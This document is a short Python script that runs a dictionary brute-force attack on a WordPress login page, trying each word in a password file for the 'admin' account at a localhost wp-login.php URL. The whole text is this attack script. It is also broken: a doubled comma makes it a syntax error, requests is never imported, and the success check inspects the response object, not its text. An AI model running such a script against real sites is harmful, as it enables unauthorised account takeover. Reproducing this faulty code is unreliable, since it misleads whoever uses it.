passwords = "your-password-dictionary-here.txt"

with open(passwords, "r") as f:
    for word in f:
        word = word.strip("\n")
        brute_ = requests.post("http://localhost/wp-login.php", data={"log":"admin",,"pwd":word})

        if "ERROR" not in brute_:
            print("Ayy, ya did it. Password was: " + word)
            break
        else:
            print("Nope, it's not this one: " + word)
        
